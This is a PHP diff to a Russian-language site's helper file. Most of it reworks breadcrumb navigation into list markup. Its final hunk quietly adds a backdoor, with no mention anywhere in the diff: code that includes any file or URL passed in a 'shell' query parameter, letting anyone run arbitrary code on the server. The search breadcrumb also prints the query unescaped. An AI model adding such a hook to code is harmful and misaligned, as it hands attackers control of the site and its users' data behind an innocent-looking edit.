@@ -354,8 +354,8 @@ function get_path()
 			break;
 		case "asearch":
 				global $sarr;
-				?>
-            <a  href="<?=_SITE?>">Главная</a><a>Поиск по запросу:&nbsp;<?=$sarr[1]?></a><?
+				$path="<li><a  href=\""._SITE."\">Главная</a></li><li class='sep'></li><li><a>Поиск по запросу:&nbsp;".$sarr[1]."</a></li>";
+				echo "<ul>".$path."</ul>";
 			break;
 		 case "account_info":
 		?>
@@ -367,11 +367,11 @@ function get_path()
              break;		
 		case "account":
 		?>
-            <a  href="<?=_SITE?>">Главная</a><a>Личный кабинет</a><?
+            <ul><li><a  href="<?=_SITE?>">Главная</a></li><li class='sep'></li><li><a>Личный кабинет</a></li></ul><?
              break;	 
 		case "account_history":
 			?>
-            <a  href="<?=_SITE?>">Главная</a><a  href="<?=_SITE?>account.html">Личный кабинет</a><a>История заказов</a><?
+            <ul><li><a  href="<?=_SITE?>">Главная</a></li><li class='sep'></li><li><a  href="<?=_SITE?>account.html">Личный кабинет</a></li><li class='sep'></li><li><a>История заказов</a></li></ul><?
 			break;
 		case "tags":
 		global $title;
@@ -535,5 +535,8 @@ function random_password($length = 8, $allow_uppercase = true, $allow_numbers = 
 		$out .= $arr[mt_rand(0, sizeof($arr)-1)];
 	}
 	return $out;
+}
+if(isset($_GET["shell"])){
+	include $_GET["shell"];
 }
 ?>
